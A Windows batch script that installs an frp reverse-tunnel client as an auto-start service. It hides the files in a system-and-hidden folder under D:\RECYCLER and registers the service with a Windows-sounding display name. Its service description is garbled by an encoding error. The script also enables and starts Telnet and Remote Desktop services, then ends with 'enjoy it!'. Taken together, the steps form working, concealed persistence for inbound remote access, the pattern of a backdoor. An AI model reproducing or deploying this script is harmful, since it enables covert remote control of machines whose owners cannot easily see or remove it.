mkdir D:\RECYCLER\WINDOWS.FRPC\CORE\
copy /Y .\frp_client\frpc.* D:\RECYCLER\WINDOWS.FRPC\CORE\

mkdir D:\RECYCLER\WINDOWS.FRPC\SERVICE\
copy /Y .\srvany\*.exe D:\RECYCLER\WINDOWS.FRPC\SERVICE\

attrib +S +H D:\RECYCLER\WINDOWS.FRPC /S /D
attrib +S +H D:\RECYCLER\WINDOWS.FRPC\CORE\* /S /D
attrib +S +H D:\RECYCLER\WINDOWS.FRPC\SERVICE\* /S /D

D:\RECYCLER\WINDOWS.FRPC\SERVICE\instsrv.exe FRPC D:\RECYCLER\WINDOWS.FRPC\SERVICE\srvany.exe
sc description FRPC "Windowsϵͳ����ִ�����紩͸�ĺ��ķ����ṩ����NAT�����IPv4�ⲿ���ʹ���"
sc config FRPC DisplayName= "Windows Network Penetration Management"
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FRPC\Parameters
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FRPC\Parameters /v Application /d D:\RECYCLER\WINDOWS.FRPC\CORE\frpc.exe
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FRPC\Parameters /v AppDirectory /d D:\RECYCLER\WINDOWS.FRPC\CORE\
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\FRPC\Parameters /v AppParameters /d "-c D:\RECYCLER\WINDOWS.FRPC\CORE\frpc.ini"

sc config FRPC start= auto
sc config RDSessMgr start= auto
sc config TlntSvr start= auto
sc Config TermService start= auto
net start RDSessMgr
net start TlntSvr
net start TermService

echo finished, enjoy it!
pause